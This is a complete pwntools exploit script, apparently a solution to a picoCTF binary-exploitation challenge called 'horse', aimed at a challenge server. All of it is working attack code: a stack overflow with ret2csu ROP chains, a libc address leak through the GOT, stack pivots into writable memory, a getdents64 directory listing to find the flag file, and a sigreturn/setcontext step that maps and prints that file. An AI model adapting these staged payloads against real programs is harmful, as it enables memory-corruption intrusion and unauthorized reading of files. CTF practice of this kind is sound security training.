from pwn import *

context.binary = ELF('./horse')
elf = context.binary
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

csu_pop = 0x400bf6
csu_call = 0x400be0
pop_rdi = 0x400c03
pop_rsi_r15 = 0x400c01
pop_rbp = 0x400828
leave_ret = 0x400b5b

write_got = elf.got['write']
read_got = elf.got['read']

# stage2 lives inside .dynamic; keep it compact
stage2_addr = 0x601e80
STAGE2_TOTAL = 0x200
STAGE3_TOTAL = 0x800
STAGE4_TOTAL = 0x800
BANNER_LEN = 0x8b

stage1_pad = b'A' * 0x20 + b'B' * 8


def csu_call_seq(func_ptr, rdi, rsi, rdx):
    return flat(
        csu_pop,
        0,
        0,
        1,
        func_ptr,
        rdi,
        rsi,
        rdx,
        csu_call,
        0, 0, 0, 0, 0, 0, 0
    )


def build_stage1(stage2_len):
    rop = b''
    rop += csu_call_seq(write_got, 1, read_got, 8)
    rop += csu_call_seq(read_got, 0, stage2_addr, stage2_len)
    rop += flat(pop_rbp, stage2_addr, leave_ret)
    return stage1_pad + rop


def build_stage2(stage3_addr, stage3_len):
    chain = [
        csu_call_seq(read_got, 0, stage3_addr, stage3_len),
        flat(pop_rbp, stage3_addr, leave_ret)
    ]
    new_rbp = stage2_addr + 0x80
    payload = flat(new_rbp, *chain)
    return payload.ljust(STAGE2_TOTAL, b'\x00')


def build_stage3(libc_base, stage3_addr, stage4_addr, stage4_len):
    data = {}
    def reserve(addr, content):
        data[addr] = content
        return addr

    open_ptr = reserve(stage3_addr + 0x500, p64(libc_base + libc.symbols['open']))
    getdents_ptr = reserve(stage3_addr + 0x508, p64(libc_base + libc.symbols['getdents64']))
    write_ptr = reserve(stage3_addr + 0x510, p64(libc_base + libc.symbols['write']))
    read_ptr = reserve(stage3_addr + 0x518, p64(libc_base + libc.symbols['read']))

    dot_addr = stage3_addr + 0x520
    data[dot_addr] = b'.\x00'

    dir_buf = stage3_addr + 0x560

    chain = [
        csu_call_seq(open_ptr, dot_addr, 0, 0),
        csu_call_seq(getdents_ptr, 3, dir_buf, 0x400),
        csu_call_seq(write_ptr, 1, dir_buf, 0x400),
        csu_call_seq(read_ptr, 0, stage4_addr, stage4_len),
        flat(pop_rbp, stage4_addr, leave_ret)
    ]

    stage3_rbp = stage3_addr + 0x200
    stack = flat(stage3_rbp, *chain)

    blob = bytearray(stack)
    for addr, content in data.items():
        offset = addr - stage3_addr
        while len(blob) < offset:
            blob += b'\x00'
        blob[offset:offset+len(content)] = content
    return bytes(blob)


def build_stage4(libc_base, stage4_addr, flag_name):
    open_ptr = stage4_addr + 0x700
    write_ptr = stage4_addr + 0x708
    exit_ptr = stage4_addr + 0x710

    ptr_data = {
        open_ptr: p64(libc_base + libc.symbols['open']),
        write_ptr: p64(libc_base + libc.symbols['write']),
        exit_ptr: p64(libc_base + libc.symbols['exit']),
    }

    flag_addr = stage4_addr + 0x720
    flag_bytes = flag_name.encode() + b'\x00'
    ptr_data[flag_addr] = flag_bytes

    map_addr = 0xdead000
    frame_addr = stage4_addr + 0x400
    after_mmap = stage4_addr + 0x500

    frame = SigreturnFrame()
    frame.rsp = after_mmap
    frame.rbp = after_mmap + 0x80
    frame.rip = libc_base + libc.symbols['mmap']
    frame.rdi = map_addr
    frame.rsi = 0x1000
    frame.rdx = 1
    frame.rcx = 0x12
    frame.r8 = 4
    frame.r9 = 0

    ptr_data[frame_addr] = bytes(frame)

    chain = [
        csu_call_seq(open_ptr, flag_addr, 0, 0),
        flat(pop_rdi, frame_addr, libc_base + libc.symbols['setcontext'] + 0x3d),
    ]

    chain_after = [
        csu_call_seq(write_ptr, 1, map_addr, 0x100),
        csu_call_seq(exit_ptr, 0, 0, 0)
    ]

    stage4_rbp = stage4_addr + 0x200
    stack = flat(stage4_rbp, *chain)
    after_stack = flat(*chain_after)

    blob = bytearray(stack)
    offset = after_mmap - stage4_addr
    while len(blob) < offset:
        blob += b'\x00'
    blob[offset:offset+len(after_stack)] = after_stack

    for addr, content in ptr_data.items():
        pos = addr - stage4_addr
        while len(blob) < pos:
            blob += b'\x00'
        blob[pos:pos+len(content)] = content

    return bytes(blob)


def parse_dir_listing(data):
    pos = 0
    while pos + 19 <= len(data):
        reclen = u16(data[pos+16:pos+18])
        if reclen <= 0:
            break
        name = data[pos+19:pos+reclen].split(b'\x00', 1)[0]
        if name.startswith(b'flag-'):
            return name.decode()
        pos += reclen
    return None


def exploit(host, port):
    if host:
        io = remote(host, port)
    else:
        io = process(elf.path)

    io.recvrepeat(0.2)
    io.send(build_stage1(STAGE2_TOTAL))
    stage1_out = io.recvrepeat(0.5)
    log.info(f"stage1 output {len(stage1_out)} bytes")
    if len(stage1_out) < 8:
        raise ValueError("short stage1 output")
    leak = u64(stage1_out[-8:])
    libc_base = leak - libc.symbols['read']
    log.info(f"libc leak: {hex(leak)} base {hex(libc_base)}")

    stage3_addr = libc_base + libc.bss() + 0x800
    stage4_addr = libc_base + libc.bss() + 0x1800

    io.send(build_stage2(stage3_addr, STAGE3_TOTAL))
    stage3_payload = build_stage3(libc_base, stage3_addr, stage4_addr, STAGE4_TOTAL)
    assert len(stage3_payload) <= STAGE3_TOTAL
    io.send(stage3_payload.ljust(STAGE3_TOTAL, b'\x00'))

    listing = io.recvn(0x400)
    flag_name = parse_dir_listing(listing)
    if not flag_name:
        log.error("failed to parse flag name")
        return
    log.info(f"flag file: {flag_name}")

    stage4_payload = build_stage4(libc_base, stage4_addr, flag_name)
    assert len(stage4_payload) <= STAGE4_TOTAL
    io.send(stage4_payload.ljust(STAGE4_TOTAL, b'\x00'))
    result = io.recvuntil(b'}')
    print(result.decode(errors='ignore'))


if __name__ == '__main__':
    exploit('mars.picoctf.net', 31809)
